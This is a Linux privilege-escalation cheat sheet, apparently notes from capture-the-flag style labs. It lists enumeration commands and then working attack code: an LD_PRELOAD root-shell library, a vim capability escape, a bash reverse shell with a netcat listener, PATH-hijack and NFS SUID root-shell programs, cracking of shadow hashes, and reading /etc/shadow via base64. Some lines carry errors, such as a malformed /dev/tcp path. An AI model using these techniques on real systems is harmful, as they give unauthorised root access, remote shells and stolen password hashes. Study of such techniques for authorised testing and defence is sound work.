*************** LINUX PRIVILEGE ESCALATION ******************


# 1. BASIC ENUMERATION

1. hostname → shows system hostname  
2. uname -a → kernel + system info  
3. cat /proc/version → kernel + compiler info  
4. cat /etc/issue → OS information  
5. env → environment variables  

# 2. PROCESS ENUMERATION

1. ps → running processes  
2. ps -A → all processes  
3. ps axjf → process tree view  
4. ps aux → processes with users  

# 3. SUDO CHECK

1. sudo -l → shows allowed sudo commands  

# 4. USER ENUMERATION

1. cat /etc/passwd → all system users  
2. cat /etc/passwd | cut -d ":" -f 1 → extract usernames  
3. cat /etc/passwd | grep home → users with home directory  

# 5. NETWORK ENUMERATION

1. netstat -a → all connections  
2. netstat -at / -au → TCP / UDP connections  
3. netstat -l → listening ports  
4. netstat -s → network statistics  
5. netstat -tp / -ltp → service + PID  
6. netstat -i → interface stats  
7. netstat -ano → numeric output  

# 6. FILE SEARCH (FIND COMMANDS)

1. find / -type d -name config → find config folder  
2. find / -type f -perm 0777 → world writable files  
3. find / -perm a=x → executable files  
4. find / -mtime 10 → modified in last 10 days  
5. find / -atime 10 → accessed in last 10 days  
6. find / -cmin -60 → changed in last 60 minutes  
7. find / -amin -60 → accessed in last 60 minutes  
8. find / -size 50M → files of size 50MB  

9. find / -writable -type d 2>/dev/null → writable dirs  
10. find / -perm -222 -type d 2>/dev/null → writable dirs  
11. find / -perm -o w -type d 2>/dev/null → world writable dirs  
12. find / -perm -o x -type d 2>/dev/null → executable dirs  
13. find / -type f -perm -04000 -ls 2>/dev/null → SUID/SGID files  

14. find / -name perl*  
15. find / -name python*  
16. find / -name gcc*  

17. find / -perm -u=s -type f 2>/dev/null → SUID binaries  

# 7. LD_PRELOAD PRIV ESC
 
STEP 1: C CODE
----------------
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

STEP 2: COMPILE
----------------
gcc -fPIC -shared -o shell.so shell.c -nostartfiles  

STEP 3: EXECUTE
----------------
sudo LD_PRELOAD=/home/user/shell.so find  

# 8. PASSWORD FILE CRACKING

1. unshadow passwd.txt shadow.txt > passwords.txt  

# 9. CAPABILITIES ESCALATION

1. getcap -r / 2>/dev/null → check capabilities  

VIM EXPLOIT:
```
vim -c ':py3 import os; os.setuid(0); os.system("/bin/sh")'  
```

# 10. CRON JOB ESCALATION

1. cat /etc/crontab → check scheduled tasks  

Reverse shell:
```
bash -i >& /devtcp/IP/6666 0>&1  
nc -lvnp 6666  
```

# 11. PATH HIJACKING

STEP 1:
```
export PATH=/tmp:$PATH  
```

STEP 2: EXPLOIT CODE
---------------------
```
#include<unistd.h>
#include<stdlib.h>

void main(){
setuid(0);
setgid(0);
system("thm");
}
```

STEP 3:
```
gcc exploit.c -o path -w  
chmod u+s path  
```

STEP 4:
```
echo "/bin/bash" > thm  
chmod 777 thm  
./path  
```

# 12. NFS PRIV ESC

```
cat /etc/exports  
```
```
showmount -e IP  
```
```
mount -t nfs IP:/path /tmp/mount  
```

EXPLOIT:
```
#include<stdlib.h>
#include<stdio.h>
#include<unistd.h>

int main(){
setuid(0);
setgid(0);
system("/bin/bash");
}
```

```
gcc shell.c -o shell -w  
chmod +sx shell  
./shell
```

# 13. LFILE METHOD
```
find / -type f -perm 04000 -ls 2>/dev/null  
```
```
LFILE=/etc/shadow
```
/usr/bin/base64 "$LFILE" | base64 --decode  
